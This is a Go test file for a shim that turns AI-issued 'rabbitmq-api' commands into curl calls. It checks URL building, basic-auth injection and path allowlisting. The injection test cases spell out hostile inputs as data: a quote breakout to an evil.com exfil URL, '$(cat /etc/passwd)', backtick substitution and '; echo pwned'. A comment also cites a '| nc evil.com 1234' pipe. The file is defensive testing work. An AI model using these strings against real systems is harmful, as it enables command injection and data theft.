package handlers

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// curlStubDir writes a fake `curl` onto a tmp dir and returns the dir so it can
// be prepended to PATH. The stub prints each argv element on its own line, which
// lets the tests observe exactly how the shell split the generated command into
// arguments — same technique the kafka tests use to catch word-splitting
// regressions.
func curlStubDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	stub := "#!/bin/sh\nfor a in \"$@\"; do printf '%s\\n' \"$a\"; done\n"
	path := filepath.Join(dir, "curl")
	require.NoError(t, os.WriteFile(path, []byte(stub), 0o755))
	return dir
}

// runRabbitmqAPICommand builds the rabbitmq-api workspace action, then executes
// the generated shell command locally with a stubbed curl and the supplied
// RABBITMQ_* env vars. Returns the argv that curl actually received.
func runRabbitmqAPICommand(t *testing.T, command string, env map[string]string) []string {
	t.Helper()
	_, params, err := buildWorkspaceAction("rabbitmq-api", command, nil, nil, "shell:latest")
	require.NoError(t, err)
	shellCommand, ok := params["command"].(string)
	require.True(t, ok, "command must be a string")

	cmd := exec.Command("/bin/sh", "-c", shellCommand)
	cmd.Env = []string{"PATH=" + curlStubDir(t) + ":" + os.Getenv("PATH")}
	for k, v := range env {
		cmd.Env = append(cmd.Env, k+"="+v)
	}
	out, err := cmd.CombinedOutput()
	require.NoErrorf(t, err, "shell command failed: %s\noutput: %s", shellCommand, out)

	return strings.Split(strings.TrimRight(string(out), "\n"), "\n")
}

// TestRewriteRabbitmqAPICommand covers the pure rewrite: verb-and-path parsing,
// URL construction, extra-arg pass-through, and the validation branches that
// must reject malformed input BEFORE dispatch.
func TestRewriteRabbitmqAPICommand(t *testing.T) {
	t.Run("simple GET with path", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Equal(t,
			`curl -s -X GET -u "$RABBITMQ_USER:$RABBITMQ_PASSWORD" "http://$RABBITMQ_HOST:${RABBITMQ_MGMT_PORT:-15672}/api/overview"`,
			got)
	})

	t.Run("method is upper-cased", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api get /api/queues")
		require.NoError(t, err)
		assert.Contains(t, got, `-X GET `)
	})

	t.Run("URL-encoded vhost in path is preserved verbatim", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/queues/%2F/my_queue")
		require.NoError(t, err)
		assert.Contains(t, got, "/api/queues/%2F/my_queue")
	})

	t.Run("extra curl args pass through unchanged", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand(`rabbitmq-api PUT /api/queues/%2F/foo -d '{"durable":true}' -H "content-type: application/json"`)
		require.NoError(t, err)
		assert.Contains(t, got, `-X PUT`)
		assert.Contains(t, got, `-d '{"durable":true}'`)
		assert.Contains(t, got, `-H "content-type: application/json"`)
	})

	t.Run("host and port refs are hard-locked (no arbitrary URL)", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Contains(t, got, `"http://$RABBITMQ_HOST:${RABBITMQ_MGMT_PORT:-15672}`,
			"URL host/port must be shell env refs, not literals — otherwise the shim becomes an SSRF gadget")
		assert.NotContains(t, got, "https://",
			"management API is http — https here would silently break")
	})

	t.Run("credentials are injected as basic auth from env", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET /api/overview")
		require.NoError(t, err)
		assert.Contains(t, got, `-u "$RABBITMQ_USER:$RABBITMQ_PASSWORD"`,
			"basic-auth must be injected via the env-var pair — never a literal password")
	})

	t.Run("leading whitespace is tolerated", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("   rabbitmq-api GET /api/nodes")
		require.NoError(t, err)
		assert.Contains(t, got, "/api/nodes")
	})

	t.Run("rejects unsupported HTTP method", func(t *testing.T) {
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api CONNECT /api/overview")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "unsupported HTTP method")
	})

	t.Run("rejects path that does not start with /", func(t *testing.T) {
		// A path without a leading '/' fails the allowlist regex because that
		// regex anchors on '^/'. This is the same rejection path as the
		// SSRF-bypass attempts below — both end up in "outside the safe
		// URL-path allowlist" — which is intentional: one rule to reason about.
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET api/overview")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "outside the safe URL-path allowlist")
	})

	t.Run("rejects call without method or path", func(t *testing.T) {
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "expected 'rabbitmq-api METHOD /path")
	})

	t.Run("rejects wrong leading token (guard against mis-dispatch)", func(t *testing.T) {
		_, err := rewriteRabbitmqAPICommand("curl -X GET /api/overview")
		require.Error(t, err)
	})

	t.Run("multi-space between header tokens is tolerated", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api   GET   /api/overview")
		require.NoError(t, err, "multi-space between METHOD and /path must not trip parsing")
		assert.Contains(t, got, "/api/overview")
	})

	t.Run("tabs between header tokens are tolerated", func(t *testing.T) {
		got, err := rewriteRabbitmqAPICommand("rabbitmq-api\tGET\t/api/nodes")
		require.NoError(t, err, "tab whitespace between header tokens must not trip parsing")
		assert.Contains(t, got, "/api/nodes")
	})

	// The path is interpolated inside a double-quoted shell string; anything
	// that could close the quote or trigger command substitution defeats the
	// SSRF scope-lock. Every case below MUST return an error — otherwise the
	// generated curl would target additional URLs or execute shell commands
	// the LLM chose.
	//
	// Scope note: this test covers ONLY the path segment (URL-breakout /
	// command-substitution class). Pipes / redirects / semicolons that appear
	// AFTER the path — e.g. `rabbitmq-api GET /api/x | nc evil.com 1234` —
	// parse cleanly (path = /api/x, extra = "| nc evil.com 1234") and are
	// passed through with the same trust model as every other workspace
	// shim's extra-args passthrough (rabbitmqadmin's suffix, psql's -c body,
	// curl's -d/-H/-o). Their blast radius is the customer-env pod's
	// NetworkPolicy, not this rewrite. See rewriteRabbitmqAPICommand's
	// security-note doc comment.
	t.Run("SSRF/injection surface — path is allowlist-filtered", func(t *testing.T) {
		injectionAttempts := []struct {
			name string
			path string
		}{
			{"double-quote breakout (append second curl URL)", `/api/x" http://evil.com/exfil "`},
			{"command substitution via $(...)", `/api/x$(cat /etc/passwd)`},
			{"command substitution via backticks", "/api/x`cat /etc/passwd`"},
			{"variable expansion via $VAR", `/api/x$SOME_SECRET`},
			{"backslash escape (could re-open quote parsing)", `/api/x\`},
			{"single quote (breaks the outer double-quote's context on some shells)", `/api/x'foo'`},
			{"parentheses (subshell if quote-broken)", `/api/x(y)`},
			{"braces (brace expansion if quote-broken)", `/api/x{a,b}`},
			{"exclamation (history expansion in interactive bash)", `/api/x!42`},
			{"asterisk (glob if quotes lost)", `/api/x*`},
			{"semicolon inside path (embedded command separator)", `/api/x;y`},
		}
		for _, tc := range injectionAttempts {
			t.Run(tc.name, func(t *testing.T) {
				_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + tc.path)
				require.Errorf(t, err, "path %q must be rejected to preserve SSRF scope-lock", tc.path)
				assert.Contains(t, err.Error(), "outside the safe URL-path allowlist",
					"rejection reason should point to the allowlist so ops can debug misconfigured paths")
			})
		}
	})

	// URL-legal characters that are ALSO safe inside double quotes must pass.
	// This is the counterpart to the SSRF test: over-rejecting would break
	// legitimate management-API paths that use query strings, fragments, or
	// URL-encoded octets.
	t.Run("URL-legal characters that are quote-safe must pass", func(t *testing.T) {
		safePaths := []string{
			`/api/queues/%2F/my_queue`,                    // URL-encoded vhost — the canonical case
			`/api/queues?columns=name,messages,consumers`, // query string with commas
			`/api/queues/%2F/my_queue#anchor`,             // fragment
			`/api/nodes/rabbit@host-1.example.com`,        // @ and . and -
			`/api/definitions/[some-vhost]`,               // brackets (rare but URL-legal)
			`/api/exchanges/%2F/amq.default`,              // dot in path
			`/api/policies/%2F/foo_bar~baz`,               // underscore and tilde
			`/api/vhosts/prod:eu-west`,                    // colon
			`/api/things/a+b+c`,                           // plus (space encoding in query)
		}
		for _, p := range safePaths {
			t.Run(p, func(t *testing.T) {
				got, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + p)
				require.NoError(t, err, "URL-legal, quote-safe path %q must pass — over-rejection would block real mgmt-API calls", p)
				assert.Contains(t, got, p)
			})
		}
	})

	// End-to-end: even if a hostile path SOMEHOW got past the allowlist, prove
	// the shell rewrite doesn't execute the injected fragment. Belt-and-braces:
	// this test would fail loudly if the allowlist regex is ever loosened
	// without corresponding shell-quoting changes, catching accidental
	// re-introduction of the vulnerability.
	t.Run("if path validation is bypassed, injection attempts must fail closed", func(t *testing.T) {
		// This calls the internal rewrite directly; we do NOT expose a code
		// path that skips the allowlist in production. The test simply pins
		// the property so a future refactor doesn't quietly break it.
		hostile := `/api/x" ; echo pwned #`
		_, err := rewriteRabbitmqAPICommand("rabbitmq-api GET " + hostile)
		require.Error(t, err, "path with quote-break + command must be REJECTED, not merely 'escaped'")
	})
}

// TestBuildWorkspaceAction_RabbitmqAPI_EndToEnd runs the generated shell
// command against a stubbed curl and asserts curl received the right argv.
// This catches word-splitting / quoting regressions in the generated shell
// string that a pure rewrite unit test can't see — same technique as the
// kafka SASL-quoting tests.
func TestBuildWorkspaceAction_RabbitmqAPI_EndToEnd(t *testing.T) {
	env := map[string]string{
		"RABBITMQ_HOST":     "rabbit.svc.cluster.local",
		"RABBITMQ_USER":     "app-user",
		"RABBITMQ_PASSWORD": "s3cr3t with spaces",
		// RABBITMQ_MGMT_PORT deliberately unset — must fall back to 15672.
	}

	t.Run("GET arrives with correct URL and basic-auth as a single arg", func(t *testing.T) {
		args := runRabbitmqAPICommand(t, "rabbitmq-api GET /api/overview", env)

		assert.Contains(t, args, "-X", "curl must receive an explicit -X flag")
		assert.Contains(t, args, "GET", "method must be a discrete arg after -X")
		assert.Contains(t, args, "-u", "curl must receive -u for basic auth")
		assert.Contains(t, args, "app-user:s3cr3t with spaces",
			"basic-auth string must arrive as ONE argument even with spaces in the password — otherwise auth silently breaks")
		assert.Contains(t, args, "http://rabbit.svc.cluster.local:15672/api/overview",
			"URL must expand env refs and fall back to port 15672 when RABBITMQ_MGMT_PORT is unset")
	})

	t.Run("URL-encoded vhost segment survives shell round-trip", func(t *testing.T) {
		args := runRabbitmqAPICommand(t, "rabbitmq-api GET /api/queues/%2F/anomaly_processing", env)
		assert.Contains(t, args, "http://rabbit.svc.cluster.local:15672/api/queues/%2F/anomaly_processing",
			"%2F (URL-encoded /) must not be shell-mangled")
	})

	t.Run("RABBITMQ_MGMT_PORT override is honored", func(t *testing.T) {
		envWithPort := map[string]string{}
		for k, v := range env {
			envWithPort[k] = v
		}
		envWithPort["RABBITMQ_MGMT_PORT"] = "25672"

		args := runRabbitmqAPICommand(t, "rabbitmq-api GET /api/overview", envWithPort)
		assert.Contains(t, args, "http://rabbit.svc.cluster.local:25672/api/overview",
			"non-default mgmt port from the k8s secret must reach curl")
	})
}

// TestBuildWorkspaceAction_RabbitmqAPI_RoutesUnchangedForOthers pins that the
// new rabbitmq-api branch does NOT change the existing rabbitmqadmin / curl
// rewrites — those paths were the whole reason the shim mechanism existed
// pre-rabbitmq-api, and PR reviewers should be able to verify the addition
// didn't regress them by inspection.
func TestBuildWorkspaceAction_RabbitmqAPI_RoutesUnchangedForOthers(t *testing.T) {
	t.Run("rabbitmqadmin passes through the existing credential-injection rewrite", func(t *testing.T) {
		_, params, err := buildWorkspaceAction("rabbitmqadmin", "rabbitmqadmin list queues", nil, nil, "shell:latest")
		require.NoError(t, err)
		cmd, _ := params["command"].(string)
		assert.Contains(t, cmd, "--host $RABBITMQ_HOST")
		assert.Contains(t, cmd, "--username $RABBITMQ_USER")
		assert.NotContains(t, cmd, "rabbitmq-api",
			"a rabbitmqadmin command must not accidentally get the rabbitmq-api rewrite")
	})

	t.Run("bare curl /api/... passes through the existing curl-auth rewrite", func(t *testing.T) {
		_, params, err := buildWorkspaceAction("rabbitmq", "curl http://$RABBITMQ_HOST:$RABBITMQ_PORT/api/overview", nil, nil, "shell:latest")
		require.NoError(t, err)
		cmd, _ := params["command"].(string)
		assert.Contains(t, cmd, "curl -s -u $RABBITMQ_USER:$RABBITMQ_PASSWORD")
		assert.Contains(t, cmd, "${RABBITMQ_MGMT_PORT:-15672}")
	})
}
